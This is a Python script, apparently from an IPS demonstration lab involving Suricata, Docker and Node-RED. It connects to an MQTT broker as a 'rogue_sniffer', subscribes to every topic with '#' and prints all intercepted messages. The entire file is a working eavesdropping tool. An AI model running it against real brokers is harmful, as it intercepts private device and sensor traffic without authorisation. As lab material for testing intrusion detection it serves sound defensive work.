import paho.mqtt.client as mqtt
import argparse
import sys
import time

def on_disconnect(client, userdata, rc):
    if rc != 0:
        print("\n🚨 CONNECTION BLOCKED: Suricata IPS actively terminated this socket (TCP RST)!")
        print("🚨 Attack Failed: Cannot maintain session to sniff data.\n")
        sys.stdout.flush()
        sys.exit(1)

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker! Subscribing to all topics (#)...")
        # Subscribe to the universal wildcard topic to intercept all messages
        client.subscribe("#")
    else:
        print(f"Failed to connect, return code {rc}")
        sys.exit(1)

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode('utf-8')
    except Exception:
        payload = msg.payload
    print(f"[SNIFFED] Topic: {msg.topic} | Payload: {payload}")
    sys.stdout.flush() # Ensure it shows up in Docker logs immediately

# Module-level parser for testing
parser = argparse.ArgumentParser(description="MQTT Traffic Sniffer")
parser.add_argument("--broker", required=True, help="MQTT Broker IP/Hostname")
parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
parser.add_argument("--timeout", type=int, default=10, help="Seconds to sniff")

if __name__ == "__main__":
    args = parser.parse_args()
    
    client = mqtt.Client("rogue_sniffer")
    client.on_connect = on_connect
    client.on_disconnect = on_disconnect
    client.on_message = on_message
    
    print(f"Connecting to {args.broker}:{args.port}...")
    try:
        client.connect(args.broker, args.port, 60)
        client.loop_start()
        print(f"Sniffing traffic for {args.timeout} seconds...\n")
        
        # Loop to show active sniffing status instead of one long sleep
        for elapsed in range(args.timeout):
            time.sleep(1) # wait 1 second
            
            # Print a status message every 5 seconds
            if (elapsed + 1) % 5 == 0:
                remaining = args.timeout - (elapsed + 1)
                print(f"[STATUS] Still sniffing... {remaining} seconds left")
                sys.stdout.flush() # Ensure Node-RED sees this immediately
                
        print("\nTime is up. Stopping interception.")
        client.loop_stop()
    except KeyboardInterrupt:
        print("\nStopping sniffing...")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.disconnect()
        print("Disconnected.")
